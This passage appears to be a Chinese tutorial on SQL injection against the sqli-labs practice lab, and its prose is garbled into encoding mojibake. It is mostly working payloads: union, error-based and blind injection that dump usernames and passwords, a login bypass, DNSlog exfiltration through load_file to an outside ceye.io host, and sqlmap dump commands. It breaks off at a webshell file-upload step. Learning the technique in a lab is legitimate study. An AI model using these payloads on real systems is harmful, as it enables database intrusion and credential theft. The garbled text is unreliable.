ä¼šè¿”å› 2 ä¸ªå­—æ®µã€‚ä½†è¯­å¥ä¸­ç”¨ SELECT *, 3 ... é¢å¤–æ·»åŠ äº†ä¸€ä¸ªå›ºå®šå€¼ 3ï¼ˆä½œä¸ºç¬¬ 3 ä¸ª â€œè™šæ‹Ÿå­—æ®µâ€ï¼‰ï¼Œä½¿å¾—ç¬¬äºŒä¸ªæŸ¥è¯¢çš„ç»“æœå˜æˆäº† 3 ä¸ªå­—æ®µï¼ˆ2 ä¸ªæ¥è‡ª emails è¡¨ï¼Œ1 ä¸ªå›ºå®šå€¼ï¼‰ã€‚å­—æ®µå¿…é¡»ç›¸åŒ åˆ›å»ºemailsæ•°æ®è¡¨ 1234CREATE TABLE emails( id int, email_id varchar(40)); æ’å…¥æ•°æ® 1234567891011INSERT INTO emails ( id, email_id) VALUES (1,'Dumb@dhakkan.com'), (2,'Angel@iloveu.com'), (3,'Dummy@dhakkan.Jocal'), (4,'secure@dhakkan.local'), (5,'stupid@dhakkan.local'), (6,'superman@dhakkan.local'), (7,'batman@dhakkan.local'), (8,'admin@dhakkan.com'); 1234567891011INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it'); group byå¯¹æ‰€æœ‰è¿›è¡Œåˆ†ç»„usersè¡¨å¦‚æœä¸¤ä¸ªäººåå­—ç›¸åŒï¼Œidä¸ä¸€æ ·æ²¡é—®é¢˜ï¼Œä½†æ˜¯è¦æ˜¯å¯¹å¤§é‡åˆ†ç»„å°±ä¼šå®¹æ˜“æŠ¥é”™ 12345678select department,count(id) from student group by department;#æŸ¥è¯¢departmenté™¢ç³»äººæ•° count(id)å¯¹IDè¿›è¡Œè®¡æ•°#ä¸€èˆ¬ç”¨äºäºŒåˆ†æ³•åˆ¤æ–­æ•°æ®è¡¨åˆ—æ•°select * from users where id=9 group by 2;#by2,4,8~~~ä¾æ¬¡æ’æŸ¥åˆ°æŠ¥é”™ä¸ºæ­¢ï¼Œä»è€Œç¡®å®šåˆ—æ•°ï¼›group byæ˜¯æŒ‰å¤šå°‘åˆ—æ’åºselect * from users where id=9 group by 4;select * from users order by 1; æŒ‰å‡åºæ’åºï¼Œç¬¬ä¸€åˆ— 12345select stu_id from score where c_name='è®¡ç®—æœº' order by grade desc;#gradeå‚æ•°descä½¿æ’åˆ—é¡ºåºå˜ä¸ºé™åº#æŸ¥è¯¢ â€œè®¡ç®—æœºâ€ è¿™é—¨è¯¾ç¨‹çš„æ‰€æœ‰å­¦ç”Ÿçš„å­¦å·ï¼Œå¹¶æŒ‰æˆç»©ä»é«˜åˆ°ä½æ’åºselect * from users limit 1,2; ä¸Šé¢åº”è¯¥æ˜¯ 1select * from users limit 0,2; ä¸å’Œæˆ– 1234#ä¸¤ä¸ªæ¡ä»¶éœ€è¦åŒæ—¶æ»¡è¶³select * from users where id=1 and username='benben';#ä¸¤ä¸ªæ¡ä»¶æœ‰ä¸€ä¸ªæ»¡è¶³select * from users where id=1 or username='benben'; oråœ¨postæäº¤é‡Œé¢åšä¸‡èƒ½å¯†ç åˆ¤æ–­å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ group_concat å¤šè¡Œåˆå¹¶å˜ä¸€è¡Œ 1select group_concat(id,username,password)from users; æŠŠæ‰€æœ‰å†™åˆ°çš„ç±»å…¨åˆå¹¶ 1select database() æŸ¥çœ‹å½“å‰æ•°æ®åº“åç§° 1select version() æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ï¼Œé˜²ç«å¢™ç»•è¿‡å¯ä»¥ç”¨åˆ°ï¼Œä¾‹å¦‚ä»€ä¹ˆæ³¨é‡Šç¬¦ç»•è¿‡ æŸ¥çœ‹å½“å‰æƒé™ 1show grants; unionæ³¨å…¥1.äº†è§£unionæ³¨å…¥è¿‡ç¨‹ä¸­ç”¨åˆ°çš„å…³é”®æ•°æ®åº“ã€æ•°æ®è¡¨ã€æ•°æ®åˆ—2.sqlæŸ¥è¯¢ä¸­group_concatçš„ä½œç”¨ æœ€ç»ˆç›®æ ‡ä½¿ç”¨unionæ³¨å…¥æ‹¿åˆ°é¶æœºä¸­æ•°æ®åº“é‡Œçš„æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ã€‚ æ‹¿åˆ°è¡¨åï¼Œåˆ—å 1.æå‰äº†è§£ 1?id=1' union select 1,2,3--+ å›æ˜¾ä½æ˜¯2ï¼Œ3æŸ¥æ•°æ®åº“æ˜¯security 1?id=1' union select 1,2,database()--+ ç„¶åæŸ¥æ•°æ®è¡¨ 1?id=-1' union select 1,2,table_name from information_schema.tables --+ ä»…å±äºå½“å‰æ•°æ®åº“çš„è¡¨ 1?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=database() --+ è¿™é‡Œåªèƒ½æ˜¾ç¤ºä¸€ä¸ªè¡¨åï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªgroup_concat 1?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ è¿™é‡ŒæŸ¥åˆ°äº†æ‰€æœ‰æ•°æ®è¡¨ ç´§æ¥ç€å°±æ˜¯åˆ—å 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns --+ é‡Œé¢å¾ˆå¤šæ²¡å•¥ç”¨çš„ï¼Œæˆ‘ä»¬å°±çœ‹ä¸€ä¸ªæ•°æ®è¡¨çš„åˆ—å 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+ æŸ¥å½“å‰æ•°æ®åº“ä¸­ users è¡¨çš„æ‰€æœ‰å­—æ®µåï¼ˆåˆ—åï¼‰ ç„¶åæŸ¥æœ€ç»ˆç›®æ ‡ 12345?id=-1' union select 1,2,group_concat(username,password) from users --+æˆ–è€…?id=-1' union select 1,group_concat(username,password),3 from users --+ å°æŠ€å·§ï¼Œçœ‹èµ·æ¥ä¸æ–¹ä¾¿ç§‘å¦‚ä¸‹æ“ä½œ 1?id=-1' union select 1,2,group_concat(username,&quot;~&quot;,password) from users --+ æ•°å­—å‹unionæ³¨å…¥æ•°å­—å‹ä¸éœ€è¦åˆ¤æ–­é—­åˆæ–¹å¼ 1.ç¡®å®šæ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹2.ä½¿ç”¨group byçš„äºŒåˆ†æ³•åˆ¤æ–­unionè¯­å¥ä¸­å‰ä¸€ä¸ªæŸ¥è¯¢çš„åˆ—æ•°3.ä¼˜åŒ–è¯­å¥ï¼Œå°†dæ”¹ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ•°å­—4.ä½¿ç”¨selectè¯­å¥ï¼ŒæŸ¥è¯¢é¶æœºæ•°æ®åº“åº“å5.ä½¿ç”¨selectè¯­å¥ï¼ŒæŸ¥è¯¢é¶æœºæ‰€æœ‰è¡¨å6.ä½¿ç”¨selectè¯­å¥ï¼ŒæŸ¥è¯¢é¶æœºæ‰€æœ‰åˆ—å7.æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·åå¯†ç  less-2åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥ç”¨2-1 å’Œ1å»æ¯”è¾ƒï¼Œç›¸åŒå°±æ˜¯æ•°å­—å‹ è¿™é‡Œå°±ä¸ç”¨å»é—­åˆäº†æˆ‘ä»¬æ¥ç€å»åˆ¤æ–­åˆ—æ•°ï¼Œè¿™é‡Œç”¨order byåˆ¤æ–­æ˜¯3åˆ—æ¥ç€è”åˆæ³¨å…¥ï¼Œè®°å¾—è¦æ”¹æˆ-1ä¸ç„¶åªä¼šå›æ˜¾ç¬¬ä¸€è¡Œ `` Post unionPOSTæäº¤å’ŒGETæäº¤POSTæäº¤çš„ä½¿ç”¨HackBarPOSTæäº¤æ³¨å…¥POSTæäº¤æŠ¥é”™æ³¨å…¥ POSTæäº¤å’ŒGETæäº¤1.getæäº¤å¯ä»¥è¢«ç¼“å­˜ï¼Œpostæäº¤ä¸ä¼š2.getæäº¤å‚æ•°ä¼šä¿ç•™åœ¨æµè§ˆå™¨çš„å†å²è®°å½•é‡Œï¼Œpostæäº¤ä¸ä¼š3.getæäº¤å¯ä»¥è¢«æ”¶è—ä¸ºä¹¦ç­¾ï¼Œpostæäº¤ä¸ä¼š4.getæäº¤æœ‰é•¿åº¦é™åˆ¶ï¼Œæœ€é•¿2048ä¸ªå­—ç¬¦ï¼›postæäº¤æ²¡æœ‰é•¿åº¦è¦æ±‚ï¼Œä¸æ˜¯åªå…è®¸ä½¿ç”¨ASCIIå­—ç¬¦ï¼Œè¿˜å¯ä»¥ä½¿ç”¨äºŒè¿›åˆ¶æ•°æ®æœ‰å¯èƒ½æº¢å‡ºç»•è¿‡ï¼Œwafé˜²ç«å¢™åªæ£€æŸ¥å‰é¢å¤šå°‘ä¸ªæ•°æ®ï¼Œ9000å¤šä¸ª postæäº¤æ¯”getæäº¤æ›´å®‰å…¨ ä¸‹é¢è¿™ä¸ªurlåœ¨æµè§ˆå™¨é‡Œé¢å°±æ˜¯getæäº¤è¢«ç¼“å­˜ less-11æºä»£ç  1@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; ä¸‹é¢è¿™æ˜¯usernameä¸‡èƒ½å¯†é’¥ 1admin' or 1=1 # ä»£åˆ°ä¸Šé¢çš„è¯­å¥ä¸­å°±æ˜¯ 1@$sql=&quot;SELECT username, password FROM users WHERE username='admin' or 1=1 #' and password='$passwd' LIMIT 0,1&quot;; #æŠŠåé¢å…¨æ³¨é‡Šæ‰äº†ï¼Œ åˆ©ç”¨å‚æ•°åŒ–æŸ¥è¯¢é¿å…SQLæ³¨å…¥æ¼æ´ postæŸ¥æ•°æ®åº“ 1uname='union select 1,(select database()) #&amp;passwd=123&amp;Submit=Submit åˆ¤æ–­åˆ—æ•° 1uname=admin'group by 2#&amp;passwd=123&amp;submit=Submit postæäº¤æŸ¥å­—æ®µ 1uname='union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')#&amp;passwd=123&amp;Submit=Submit æŸ¥æ•°æ® 1uname='union select 1,(select group_concat(username,&quot;:&quot;,password) from users)#&amp;passwd=123&amp;Submit=Submit æŠ¥é”™æ³¨å…¥extractvalueä»€ä¹ˆæ˜¯æŠ¥é”™æ³¨å…¥ æ„é€ è¯­å¥ï¼Œè®©é”™è¯¯ä¿¡æ¯ä¸­å¤¹æ‚å¯ä»¥æ˜¾ç¤ºæ•°æ®åº“å†…å®¹çš„æŸ¥è¯¢è¯­å¥è¿”å›æŠ¥é”™æç¤ºä¸­åŒ…å«æ•°æ®åº“ä¸­çš„å†…å®¹ ===1.é€šè¿‡floor()æŠ¥é”™æ³¨å…¥===*2.é€šè¿‡extractValue()æŠ¥é”™æ³¨å…¥**3.é€šè¿‡updateXml()æŠ¥é”™æ³¨å…¥*4.é€šè¿‡NAME_CONST()æŠ¥é”™æ³¨å…¥5.é€šè¿‡jion()æŠ¥é”™æ³¨å…¥6.é€šè¿‡exp()æŠ¥é”™æ³¨å…¥7.é€šè¿‡geometryCollection()æŠ¥é”™æ³¨å…¥8.é€šè¿‡polygon()æŠ¥é”™æ³¨å…¥9.é€šè¿‡multipoint()æŠ¥é”™æ³¨å…¥10.é€šè¿‡multlinestring()æŠ¥é”™æ³¨å…¥11.é€šè¿‡multpolygon()æŠ¥é”™æ³¨å…¥12.é€šè¿‡linestring()æŠ¥é”™æ³¨å…¥ å…ˆåˆ›å»ºä¸¤ä¸ªæ•°æ®åº“ 1234567891011121314151617181920212223242526272829303132create database ctfstu charset utf8;create table xml(doc varchar(150));insert into xml values('&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');insert into xml values('&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');select extractvalue(doc,'/book/author/surname')from xml; docæ˜¯åˆ—åï¼Œç¬¬äºŒä¸ªæ˜¯æŸ¥è¯¢è·¯å¾„,æŸ¥åˆ°çš„æ˜¯benben 12345678&lt;book&gt; &lt;title&gt;A bad boy how to get a girlfriend&lt;/title&gt; &lt;author&gt; &lt;initial&gt;Love&lt;/initial&gt; &lt;surname&gt;benben&lt;/surname&gt; &lt;/author&gt; &lt;/book&gt;select extractvalue(doc,'~book/author/surname')from xml; ä¸Šé¢è¿™ä¸ªæŠ¥é”™æ˜¯æœ‰å›æ˜¾è¯­å¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æŠ¥é”™å‰æ„é€ ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ 1select extractvalue(doc,concat(0x7e,(select database()))) from xml; ä¸Šè¿°æ˜¯æ˜¾ç¤ºå½“å‰åº“å less-5å°è¯•æ„é€ ä»¥ä¸‹è¯­å¥ 1?id=-1' union select 1,2,database() --+ å°è¯•æ•…æ„å†™é”™database 1?id=-1' union select 1,2,datdbase() --+ å‡ºç°å¦‚ä¸‹æŠ¥é”™å¯ä»¥çŸ¥é“å½“å‰æ•°æ®åº“çš„åº“åæ˜¯security 1234?id=100' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+#0x7eå°±æ˜¯~å·extractvalueè¿™é‡Œåˆ—å¯ä»¥éšä¾¿å†™ï¼Œä¸ºçš„å°±æ˜¯æŠ¥é”™ ä¸Šè¿°è¯­å¥ä¹Ÿå¯ä»¥æŸ¥åˆ°åº“åæ˜¯security 1?id=100' and 1=extractvalue(1,concat(0x7e,(select database()))) --+ ç„¶åæŸ¥è¡¨å 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3--+ æŸ¥åˆ°å½“å‰æ•°æ®åº“è¡¨åç»§ç»­æŸ¥åˆ—å 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) ,3--+ æœ€åæŸ¥æ•°æ® 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users))) ,3--+ æŠ¥é”™æ³¨å…¥ä¸€æ¬¡åªèƒ½è¿”å›32ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æ­¤æ—¶è¦ç”¨substringsubstring(â€œç¬¬ä¸€â€,â€ç¬¬äºŒÂ·â€,â€ç¬¬ä¸‰â€) ç¬¬ä¸€ï¼šå°±æ˜¯å­—ç¬¦ç¬¬äºŒï¼šä»å“ªä¸€ä½å¼€å§‹æ˜¾ç¤ºç¬¬ä¸‰ï¼šæ˜¾ç¤ºæ€»å…±å¤šå°‘ä½å­—ç¬¦å¦‚ä¸‹æ‰€ç¤º 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),1,3) from users))) ,3--+ flooræŠ¥é”™æ³¨å…¥æ¶‰åŠåˆ°å‡½æ•°è¾ƒå¤š rand()å‡½æ•°ï¼šéšæœºè¿”å›0-1ä¹‹é—´çš„å°æ•°floor()å‡½æ•°ï¼šå°æ•°å‘ä¸‹å–æ•´ï¼Œå‘ä¸Šå–æ•´æ•°ceiling()concat_ws()å‡½æ•°ï¼šå°†æ‹¬å·å†…æ•°æ®ç”¨ç¬¬ä¸€ä¸ªå­—æ®µè¿æ¥èµ·æ¥group by:åˆ†ç»„as:åˆ«åcount()å‡½æ•°:æ±‡æ€»ç»Ÿè®¡æ•°é‡limit:è¿™é‡Œç”¨äºæ˜¾ç¤ºæŒ‡å®šè¡Œæ•° 1234567891011121314151617181920212223?id=0' union select 1,count(*),concat_ws('-',(select concat('~',id,username,':',password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+select rand() #éšæœºç”Ÿæˆ0-1select rand() #éšæœºç”Ÿæˆ0-2select rand() from users #æœ‰å¤šå°‘è¡Œç”Ÿæˆå¤šå°‘ä¸ªéšæœºæ•°select floor(rand()*2); #éšæœº0æˆ–è€…1ï¼Œåªæœ‰ä¸¤ä¸ªç»“æœselect concat_ws('-',2,3) #2-3,æ‹¼æ¥select concat_ws('-',(select database()),floor(rand()*2)) #æ•°æ®åº“åå­—-0/1select concat_ws('-',(select database()),floor(rand()*2)) as a from users group by a; #åˆ†ç»„select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand()*2)) as a from users group by a; #æ‰§è¡Œä¸æ˜¯æ¯æ¬¡æŠ¥é”™select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand(0)*2)) as a from users group by a; #rand()æ”¹æˆrand(0)å°±ä¼šå›ºå®šæŠ¥é”™ï¼Œæ”¹æˆ1å°±ä¼šä¸æŠ¥é”™select count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a;#è¾“å‡ºåº“å?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2)) as a from users group by a --+#è·å–è¡¨åless-5?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(username,':',password) from users), floor(rand(0)*2)) as a from users group by a --+#group_concatæ— æ³•æ˜¾ç¤ºï¼Œå¯ä»¥ä½¿ç”¨concat?id=-1' union select 1, count(*), concat_ws('-', (select concat(username,':',password) from users limit 0,1), floor(rand(0)*2)) as a from users group by a --+#æŸ¥æœ€ç»ˆæ•°æ® è¿™æ˜¯åˆ†ç»„ æŸ¥æœ€ç»ˆæ•°æ® updatexmlæ³¨å…¥å‡½æ•°updatexml(XML_document,XPath_string,new_value)åŒ…å«ä¸‰ä¸ªå‚æ•°ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML documentæ˜¯stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œä¾‹å¦‚Docç¬¬äºŒä¸ªå‚æ•°ï¼šXPath stringæ˜¯è·¯å¾„ï¼ŒXPath:æ ¼å¼çš„å­—ç¬¦ä¸²ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_value,stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® updatexml æ­£å¸¸å¥å¼ 1select updatexml(doc,'/book/auther/surname','1') from xml; é”™è¯¯å¥å¼ 1select updatexml(doc,'~book/auther/surname','1') from xml; æŸ¥æ•°æ®åº“ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼šå¼•èµ·æŠ¥é”™ï¼Œä»è€Œå›æ˜¾æ•°æ®åº“åå­— 1?id=1&quot; and 1=updatexml(1,concat('~',(select database())),3) --+ æŸ¥æ•°æ®è¡¨ 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+ æŸ¥åˆ— 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) --+ ç„¶åæŸ¥åˆ°è¿™äº›ä¸ªåˆ—åï¼Œæœ€åæŸ¥æ•°æ® 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(id,username,password) from users)),3) --+ è¿™ä¸ªé™åˆ¶é•¿åº¦äº†ï¼Œç”¨substringä¿®æ”¹ä»¥ä¸‹ 1?id=1&quot; and 1=updatexml(1,concat('~',substring((select group_concat(id,username,password) from users),1,30)),3) --+ ç›²æ³¨å¸ƒå°”ç›²æ³¨ç›²æ³¨ï¼šé¡µé¢æ²¡æœ‰æŠ¥é”™å›æ˜¾ä½ï¼Œä¸çŸ¥é“æ•°æ®åº“å…·ä½“è¿”å›å€¼çš„æƒ…å†µä¸‹ï¼Œå¯¹æ•°æ®åº“å†…å®¹è¿›è¡ŒçŒœè§£ï¼Œå®è¡ŒSQLæ³¨å…¥ ç›²æ³¨åˆ†ç±»ï¼šå¸ƒå°”ç›²æ³¨ï¼Œæ—¶é—´ç›²æ³¨ï¼ŒæŠ¥é”™æ³¨å…¥ å¸ƒå°”ç›²æ³¨ï¼šwebé¡µé¢åªè¿”å›TrueçœŸï¼ŒFlaseå‡ä¸¤ç§ç±»å‹ã€‚åˆ©ç”¨é¡µé¢è¿”å›ä¸åŒï¼Œé€ä¸ªçŒœè§£æ•°æ® ç”¨å¦‚ä¸‹è¯­å¥åˆ¤æ–­æ˜¯å¦æ˜¯å¸ƒå°”ç›²æ³¨ 1?id=1' and 1=1 --+ å›å¤ä¸ºçœŸ 1?id=1' and 1=2 --+ å›å¤ä¸ºå‡ æ‰‹åŠ¨æ³¨å…¥æ‰¾åˆ°waf å…³é”®å‡½æ•°å‡½æ•°ascii() asciiç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼Œå¯ä»¥æŠŠå­—æ¯è½¬æ¢æˆå¯¹åº”æ•°å­— 1select ascii('A') 1234?id=1' and ascii(substr((select database()),1,1))&gt;=101 --+(select database())substr((select database()),1,1)ascii(substr((select database()),1,1)) å¤§äºç­‰äº115å¯ä»¥116ä¸è¡Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯115 ç¬¬äºŒä¸ªå­—ç¬¦ 1?id=1' and ascii(substr((select database()),2,1))&gt;=101 --+ ä¾æ¬¡å»è¯• 1?id=1'and ascii(substr('abcd',1,1))&gt;97 --+ æŠŠabcdæ›¿æ¢æˆè¦æŸ¥è¯¢çš„è¯­å¥å³å¯ æŸ¥è¡¨ålimit 0,1 è¡¨ç¤ºè·å–ç¬¬ 1 ä¸ªè¡¨å 12?id=1' and ascii(substr((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),1,1))&gt;100 --+ æŸ¥åˆ—å 12?id=1' and ascii(substr((select column_name from information_schema.columns wheretable_schema=database() and table_name='users' limit 0,1),1,1))&gt;100 --+ æŸ¥æ•°æ® 12?id=1' and ascii(substr((select username from users limit 0,1),1,1))&gt;100 --+?id=1' and ascii(substr((select password from users limit 0,1),1,1))&gt;100 --+ æ—¶é—´ç›²æ³¨æ—¶é—´ç›²æ³¨ï¼šwebé¡µé¢åªè¿”å›ä¸€ä¸ªæ­£å¸¸é¡µé¢ï¼Œåˆ©ç”¨é¡µé¢å“åº”æ—¶é—´ä¸åŒé€ä¸ªçŒœè§£æ•°æ® å‰ææ˜¯æ•°æ®åº“ä¼šæ‰§è¡Œå‘½ä»¤ä»£ç ï¼Œåªæ˜¯ä¸åé¦ˆé¡µé¢ä¿¡æ¯ å‰ææ˜¯æ•°æ®åº“ä¼šæ‰§è¡Œå‘½ä»¤ä»£ç ï¼Œåªæ˜¯ä¸åé¦ˆé¡µé¢ä¿¡æ¯ å…³é”®å‡½æ•°å‡½æ•°sleep() å‚æ•°ä¸ºä¼‘çœ æ—¶é•¿ï¼Œä»¥ç§’ä¸ºå•ä½ï¼Œå¯ä»¥ä¸ºå°æ•° 1select sleep(2) less-9è¾“å…¥ 1?id=1 ä»–æ˜¯å¯¹çš„ç„¶ååé¢éšä¾¿è¾“ä¸ä¼šå˜ 1?id=1 and sleep(3) --+ å¦‚æœæ˜¯æ•°å­—å‹ï¼Œå¥¹ä¼šå»¶è¿Ÿ3ç§’æ‰æ˜¾ç¤ºï¼Œè¿™é‡Œå®ƒç«‹é©¬å°±å›æ˜¾äº†ï¼Œæ˜¾ç„¶ä¸æ˜¯æ•°å­—å‹ ç„¶ååˆ¤æ–­æ˜¯ä»€ä¹ˆé—­åˆ,å¯ä»¥çœ‹åˆ°å•å¼•å·ç­‰äº†3ç§’æ‰å›æ˜¾ï¼Œè¯´æ˜å•å¼•å·é—­åˆ 1select if(1=1,sleep(0),sleep(3)); è¿™å¥è¯çš„æ„æ€æ˜¯1=1ä¸ºçœŸå°±æ‰§è¡Œä¼‘çœ 0ç§’ 1?id=1' and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+ æ¯”å¤§å°çŒœè§£ï¼Œç„¶åé€šè¿‡æ—¶é—´å“åº”åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ æœ€ç»ˆå¾—åˆ°æ•°æ®åº“åå­—çš„é¦–å­—æ¯æ˜¯114rd æŸ¥è¯¢è¡¨ 1234?id=1' and if(ascii(substr ((table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1' and if(ascii(substr ((column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1'and if(ascii(substr((select username from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+?id=1' and if(ascii(substr((select password from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+ dnslogæ³¨å…¥ç›²æ³¨çš„ä¸€ç§ï¼Œsqlmapï¼Œæ¯”ç›²æ³¨æ•ˆç‡è¦é«˜,å¯ä»¥ä¸€ç»„ä¸€ç»„ï¼Œä¸€è¡Œä¸€è¡Œçš„å‡ºæ¥ å¯¹å½“å‰æœåŠ¡å™¨è¯»å†™çš„æƒé™è¦æ‰“å¼€å¦‚æœä¸èƒ½åšSQLæ³¨å…¥æ–‡ä»¶ä¸Šä¼ ï¼Œé‚£ä¹ˆè¿™ä¸ªä¹Ÿåšä¸äº† 1select load_file(&quot;C:\\\\benben.txt&quot;); UNCè·¯å¾„æ ¼å¼ï¼šservername\\sharename,å…¶ä¸­servername:æ˜¯æœåŠ¡å™¨åã€‚sharenameæ˜¯å…±äº«èµ„æºçš„åç§°ã€‚ç›®å½•æˆ–æ–‡ä»¶çš„UNCåç§°å¯ä»¥åŒ…æ‹¬å…±äº«åç§°ä¸‹çš„ç›®å½•è·¯å¾„ï¼Œæ ¼å¼ä¸ºï¼š\\servername\\sharename\\directory \\filenameã€‚å…¶å®æˆ‘ä»¬å¹³å¸¸åœ¨Vidnowsä¸­ç”¨å…±äº«æ–‡ä»¶çš„æ—¶å€™å°±ä¼šç”¨åˆ°è¿™ç§ç½‘ç»œåœ°å€çš„å½¢å¼sss.xxxltest æŸ¥çœ‹æœ¬åœ°æ–‡ä»¶ å…ˆæŸ¥æ•°æ®åº“ 1?id=1'and select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;1.j96k1p.ceye.io\\\\1.txt&quot;))--+ æŸ¥æ•°æ®è¡¨ 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ è¿™é‡Œlimit 0ï¼Œ1æ˜¯æ˜¾ç¤ºç¬¬ä¸€ä¸ªè¡¨åemails æ˜¯ä»0å¼€å§‹åªæ˜¾ç¤ºä¸€ä¸ªlimit 1,1 æ˜¯ä»1å¼€å§‹åªæ˜¾ç¤ºä¸€ä¸ª åˆ—å 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ å·¥å…·æ³¨å…¥DnslogSqlinj 1234567891011121314151617181920Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+Options: --version show program's version number and exit -h, --help show this help message and exit -n TASKNAME, --name=TASKNAME task name -t THREAD_COUNT, --thread=THREAD_COUNT thread_count -u URL, --url=URL target include injection -i INF, --inf=INF Testing target and Try to get information --dbs get database -D DB database name --tables get table -T TABLE table name --columns get column -C COLUMN column name --dump get **data**D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://sqli:8088/Less-9/?id=1' and ({})--+&quot;D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+&quot; -D security --tables 1sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot; -D security -T users -C username,password --dump --time-sec 2 sqlæ³¨å…¥æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ä¸Šä¼ æ‹¿webshell åˆ¤æ–­mysqlæ˜¯å¦æœ‰æ–‡ä»¶è¯»å†™æƒé™ 12show variables like '%secure%';#ç”¨æ¥æŸ¥çœ‹mysqlæ˜¯å¦æœ‰è¯»å†™æ–‡ä»¶æƒé™ è¿™é‡ŒNULLæ˜¯æ²¡æœ‰æ–‡ä»¶è¯»å†™æƒé™çš„æˆ‘ä»¬åœ¨mysqlä¸‹é¢çš„my.iniæ–‡ä»¶é‡Œé¢çš„[mysqld]ç»„ä¸‹é¢åŠ ä¸€è¡Œ 1secure_file_priv=&quot;&quot; ç„¶åå°±æœ‰æ–‡ä»¶è¯»å†™æƒé™äº† 1.show variables likeâ€™%secure%â€™;ç”¨æ¥æŸ¥çœ‹mysqlæ˜¯å¦æœ‰è¯»å†™æ–‡ä»¶æƒé™ï¼›2.æ•°æ®åº“çš„fleæƒé™è§„å®šäº†æ•°æ®åº“ç”¨æˆ·æ˜¯å¦æœ‰æƒé™ï¼Œå‘æ“ä½œç³»ç»Ÿå†…å†™å…¥å’Œè¯»å–å·²å­˜åœ¨çš„æƒé™ï¼›3.into 